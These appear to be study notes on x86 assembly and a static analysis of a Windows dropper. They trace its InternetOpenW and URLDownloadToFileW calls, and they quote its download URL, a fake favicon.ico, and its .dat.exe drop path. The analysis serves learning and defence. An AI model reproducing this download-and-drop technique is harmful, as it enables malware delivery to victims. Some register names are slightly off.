- `mov`: transfer data from source to target
- `jmp`: jump to another piece of code 
- `push`: Add the element on the stack
- `pop`: Remove the last element from the stack
- `call`: Call a method
- `ret`: Return to the called function

# CPU Register
 - `eax`: **Accumulate** register
 - `edx`: **Data** register
 - `ebx`: **Base** register
 - `esp`: **Extend Stack Pointer**
 - `ebp`: **Extend Base Pointer**
 - `eip`: Extend Instruction Pointer


## Dropper Analysis Assembly 
The first thing the dropper do is to `push` the main address location in `ebp` register. This because the dropper now knows where to return when call external function.

![[Pasted image 20241214114850.png]]

### API Call

#### InternetOpenW

The dropper using the `call` instruction to call the `InternetOpenW` windows API. The interesting thing is the parameter pass in reverse to the function, that because the stack work in `LIFO`. 

![[Pasted image 20241214115751.png]]

So now we have the 
- [in] DWORD dwFlags = `push 0 `
- [in] LPCWSTR lpszProxyBypass = `push 0 `
- [in] LPCWSTR lpszProxy = `push 0 `
- [in] DWORD dwAccessType = `push 0 `
- [in] LPCWSTR lpszAgent = `push str.Mozilla_5.0; 0x403288` 

and finally the call to the `InternetOpenW`

#### URLDownloadToFileW
Similar to InternetOpenW the dropper call another windows API `URLDownloadToFileW` 

![[Pasted image 20241214120850.png]]

- `szURL` = push str.http:__ssl_6582datamanager.helpdeskbros.local_favicon.ico
- `szFileName` = push str.C:_Users_Public_Documents_CR433101.dat.exe

